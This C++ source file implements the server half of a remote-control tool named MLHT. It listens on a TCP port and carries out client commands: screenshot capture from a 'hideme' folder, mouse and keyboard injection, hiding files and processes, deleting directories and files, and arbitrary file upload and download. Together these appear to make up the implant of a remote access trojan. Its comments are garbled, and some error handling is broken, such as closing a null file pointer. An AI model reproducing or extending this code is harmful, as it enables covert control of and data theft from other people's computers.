#include "MLHT_SERVER.h"
#include "Op_Function.h"


MLHT_SERVER::MLHT_SERVER(int port){

	IDtt = 1;

	p_send = new MLHT();
	p_get = new MLHT();

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	//������������Ӧ�ó����DLL���õĵ�һ��Windows Sockets������
	//������Ӧ�ó����DLLָ��Windows Sockets API�İ汾�ż�����ض�Windows Socketsʵ�ֵ�ϸ�ڡ�
	//Ӧ�ó����DLLֻ����һ�γɹ���WSAStartup()����֮����ܵ��ý�һ����Windows Sockets API����

	s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);			//��ʼ��socket
	sockaddr.sin_family = PF_INET;							//sin_familyָ��Э���壬��socket�����ֻ����PF_INET

	sockaddr.sin_addr.S_un.S_addr = inet_addr("0.0.0.0");   //�󶨱���IP��ַ
	server_port = port;
	sockaddr.sin_port = htons(server_port);					//���÷����������Ķ˿�

	bind(s, (SOCKADDR*)&sockaddr, sizeof(SOCKADDR));		//���а󶨶���
	listen(s, 1);											//��������
}


//�ȴ��ͻ�������
void MLHT_SERVER::WaitForClient(){
	int size = sizeof(SOCKADDR);
	clientsocket = accept(s, &clientAddr, &size);               //������ֱ������tcp�ͻ�������
}


//�ȴ����ر��ģ���ⷵ�ر����Ƿ�Ϸ�
int MLHT_SERVER::WaitReturnPacket(){
	
	ZeroMemory(buffer, sizeof(buffer));

	if(recv(clientsocket, buffer, SOCKET_BUFFER_SIZE, NULL) != SOCKET_ERROR){
		if(p_get->PacketAccept(((BYTE*)buffer)))
			return PACKET_ACCEPT_SUCCESS;
		else
			return PACKET_ACCEPT_FAIL;
	}
	
	return SOCKET_ERROR;
}


//�ȴ�ACK���ر���
int MLHT_SERVER::WaitForAckPacket(){

	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsAckPacket())
		return GET_ACK;
	else
		return NOT_GET_ACK;

}


//���޲�������
void MLHT_SERVER::SendPacket(WORD mtu_type){

	ZeroMemory(buffer, sizeof(buffer));

	p_send = new MLHT(IDtt++,mtu_type);
	p_send->PacketSplice((BYTE*)buffer);
	send(clientsocket,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//���ͱ���

}


//������������
void MLHT_SERVER::SendPacket(WORD mtu_type,WORD slicenum,WORD slicesum,char* content,WORD contentlength){
		
	ZeroMemory(buffer, sizeof(buffer));

	p_send = new MLHT(IDtt++,mtu_type,slicenum,slicesum,(BYTE*)content,contentlength);
	p_send->PacketSplice((BYTE*)buffer);
	send(clientsocket,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//���ͱ���

}


//��ACK���ر���
void MLHT_SERVER::SendACKPacket(){
	SendPacket(MLHT_MTU_TYPE_ACK | p_get->GetPacketType());
}


//��FIN���ر���
void MLHT_SERVER::SendFINPacket(){
	SendPacket(MLHT_MTU_TYPE_FIN);
}


bool MLHT_SERVER::IsAckPacket(){
	return p_get->PacketAnalyze_SYNACKFIN() == MLHT_MTU_TYPE_ACK;
}


bool MLHT_SERVER::IsFinPacket(){
	return p_get->PacketAnalyze_SYNACKFIN() == MLHT_MTU_TYPE_FIN;
}


bool MLHT_SERVER::IsReturnPacket(){
	return p_get->PacketAnalyze_FILE() == p_send->PacketAnalyze_FILE();
}


//�����ļ���
int MLHT_SERVER::SendFilePacket(
	WORD mtu_type,			//�ļ�����Э������
	FILE *fp,				//�ļ�ָ��
	int contentlen			//�ļ�����
	)
{
	int ret;
	
	//�����ܷ�Ƭ��
	WORD slice_sum = contentlen/MLHT_SLICE_FILE_LENGTH;
	if(contentlen % MLHT_SLICE_FILE_LENGTH)
		slice_sum++;
	
	char p[MLHT_SLICE_FILE_LENGTH]={0};		//�ļ�ָ��
	int packetlen = MLHT_SLICE_FILE_LENGTH;	//��Ƭ����

	//��Ƭ1->n: ��ͻ���/�����������ļ���Ƭ
	for(WORD slice_num = 1;slice_num <= slice_sum;slice_num++){
		
		if(slice_num == slice_sum)									// ����ĩβ��Ƭ����
			packetlen = contentlen%MLHT_SLICE_FILE_LENGTH;

		fseek(fp,MLHT_SLICE_FILE_LENGTH*(slice_num-1),SEEK_SET);	// ˳��λ�ļ�ָ��
		fread(p,packetlen,1,fp);									// ���ļ�ָ�뿪ʼ��

		SendPacket(mtu_type,slice_num,slice_sum,p,packetlen);		// �����ļ�����

		//�ж��Ƿ񷵻�ACK��
		ret = WaitForAckPacket();
		if(ret != GET_ACK)
			return OP_FAIL;
	}

	return OP_SUCCESS;

}



//�����ļ���
int MLHT_SERVER::GetFilePacket(
	FILE *fp				//����Ŀ���ļ���ָ��
	)
{
	int ret;

	do{
		ret = WaitReturnPacket();
		if(ret != PACKET_ACCEPT_SUCCESS)
			return ret;

		if(IsReturnPacket()){
			if(fwrite(p_get->GetPacketContent(),
				p_get->GetPacketLength()-MLHT_HEADER_LENGTH,
				1,
				fp)!= 1){
					SendFINPacket();
					return FILE_WRITE_FAIL;
			}
			else
				SendACKPacket();
		}
		else if(IsFinPacket()){
			return OP_FAIL;
		}
	}while(!p_get->IsLastPacket());
	
	return OP_SUCCESS;
}


///RC OPERATR
int MLHT_SERVER::GetScreenshoot(){
		
	char Screenshootdir[MAX_PATH] = "c:\\hideme\\screen.bmp";

	printf("ScreenShoot over,sending packet:\n");

	//SceenShoot();
	
	//��������ļ�Ŀ¼�Ƿ�Ϸ�
	FILE *fp = fopen(Screenshootdir,"rb");

	if(fp == NULL){
		fclose(fp);
		SendFINPacket();
		return FILE_READ_FAIL;
	}
		
	//�����ļ���С�Ƿ����
	fseek(fp,0L,SEEK_END);			// ��λ���ļ�ĩβ
	int contentlen = ftell(fp);		// ����ָ��ƫ���ļ�ͷ��λ��(���ļ����ַ�����)
	if(contentlen > MLHT_SLICE_FILE_LENGTH){
		fclose(fp);
		SendFINPacket();
		return FILE_TOO_LARGE;
	}
	else
		SendACKPacket();

	int ret = SendFilePacket(MLHT_MTU_TYPE_RC_SCREEN,fp,contentlen);
	fclose(fp);
	return ret;

}


void MLHT_SERVER::GetMouseOperate(){

	BYTE* z = p_get->GetPacketContent();
	int x =z[0]*BYTE_SIZE+z[1];
	int y =z[2]*BYTE_SIZE+z[3];

	mouse_op(x,y);

}


void MLHT_SERVER::GetKeybroadOperate(){
		
	BYTE* z = p_get->GetPacketContent();
	int x =z[0]*BYTE_SIZE+z[1];

	keybd_op(x);
}


//File Operate
void MLHT_SERVER::GetFileHide(){
	hide_file();
	SendACKPacket();
}


void MLHT_SERVER::GetFileShow(){
	show_file();
	SendACKPacket();
}


//Process Operate
void MLHT_SERVER::GetProcessHide(){
	hide_process();
	SendACKPacket();
}


void MLHT_SERVER::GetProcessShow(){
	show_process();
	SendACKPacket();
}


//Shell Operate
bool MLHT_SERVER::GetShellLs(){
	char str[MLHT_SLICE_FILE_LENGTH] = {0};
	if(ListDir((char *)p_get->GetPacketContent(),str)){
		SendPacket(MLHT_MTU_TYPE_SHELL_LS,1,1,str,strlen(str)+1);
		return true;
	}
	else{
		SendFINPacket();
		return false;
	}
}

		
bool MLHT_SERVER::GetShellMkdir(){
	if(CrtDir((char *)p_get->GetPacketContent())){
		SendACKPacket();
		return true;
	}
	else{
		SendFINPacket();
		return false;
	}
}

		
bool MLHT_SERVER::GetShellRmdir(){
	if(DltDir((char *)p_get->GetPacketContent())){
		SendACKPacket();
		return true;
	}
	else{
		SendFINPacket();
		return false;
	}
}


bool MLHT_SERVER::GetShellRm(){
	if(deletfile((char *)p_get->GetPacketContent())){
		SendACKPacket();
		return true;
	}
	else{
		SendFINPacket();
		return false;
	}
}

		
//�����ϴ��ļ�
int MLHT_SERVER::GetUploadFile(){
	char uploadFiledir[MAX_PATH];
	memcpy(uploadFiledir,p_get->GetPacketContent(),p_get->GetPacketLength()-MLHT_HEADER_LENGTH);
	
	//��Ȿ��Ŀ¼�Ƿ�Ϸ�
	FILE* fp = fopen(uploadFiledir,"ab");
	if(fp == NULL){
		fclose(fp);
		SendFINPacket();
		return FILE_OPEN_FAIL;
	}
	else
		SendACKPacket();

	printf("Upload file path: %s\n",uploadFiledir);

	int ret = GetFilePacket(fp);
	fclose(fp);
	return ret;
}


//���������ļ�
int MLHT_SERVER::SendDownloadFile(){
	char downloadFilename[MAX_PATH];
	memcpy(downloadFilename,p_get->GetPacketContent(),p_get->GetPacketLength()-MLHT_HEADER_LENGTH);

	//��������ļ�Ŀ¼�Ƿ�Ϸ�
	FILE *fp = fopen(downloadFilename,"rb");

	if(fp == NULL){
		fclose(fp);
		SendFINPacket();
		return FILE_READ_FAIL;
	}
		
	//�����ļ���С�Ƿ����
	fseek(fp,0L,SEEK_END);			// ��λ���ļ�ĩβ
	int contentlen = ftell(fp);		// ����ָ��ƫ���ļ�ͷ��λ��(���ļ����ַ�����)
	if(contentlen > MAX_FILE_SIZE){
		fclose(fp);
		SendFINPacket();
		return FILE_TOO_LARGE;
	}
	else
		SendACKPacket();

	printf("Download file path: %s\n",downloadFilename);
	
	int ret = SendFilePacket(MLHT_MTU_TYPE_SHELL_DOWNLOAD,fp,contentlen);
	fclose(fp);
	return ret;
}